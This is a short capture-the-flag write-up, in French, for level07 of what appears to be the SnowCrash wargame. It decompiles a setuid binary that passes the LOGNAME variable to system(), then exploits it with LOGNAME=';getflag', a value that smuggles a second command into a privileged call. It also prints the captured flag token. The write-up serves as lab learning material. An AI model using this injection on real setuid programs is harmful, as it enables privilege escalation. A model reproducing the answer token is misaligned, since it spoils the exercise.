# level07:

```bash
ls -la
```

`-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07`

ghidra:

```c
/* WARNING: Unknown calling convention */

int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```

Ici on voit qu'on met le contenu de LOGNAME qui est une variable d'env dans une string en la précèdent de "/bin/echo"
donc /bin/echo level07
On execute ensuite cette string
system(local_1c);
La si on arrive à changer notre env avec un export par exemple on pourrait faire quelque chose comme:
```bash
export LOGNAME=";getflag"
```
```
./level07
```
output: `Check flag.Here is your token : fiumuikeil55xe9cu4dood66h`

